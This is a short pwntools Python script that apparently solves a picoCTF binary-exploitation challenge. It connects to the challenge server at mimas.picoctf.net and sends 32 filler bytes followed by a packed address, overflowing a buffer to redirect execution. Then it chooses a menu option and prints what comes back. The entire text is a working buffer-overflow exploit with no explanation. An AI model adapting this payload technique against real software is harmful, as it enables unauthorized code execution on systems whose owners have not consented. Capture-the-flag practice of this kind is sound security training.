from pwn import *

p = remote("mimas.picoctf.net",61601)

buffer = 32
payload = b"A" * buffer
addr = p64(0x00000000004011a0)
payload += addr

p.sendlineafter("Enter your choice: ",b"2")
p.sendlineafter("Data for buffer: ",payload)
p.sendlineafter("Enter your choice: ",b"4")
print(p.recvall())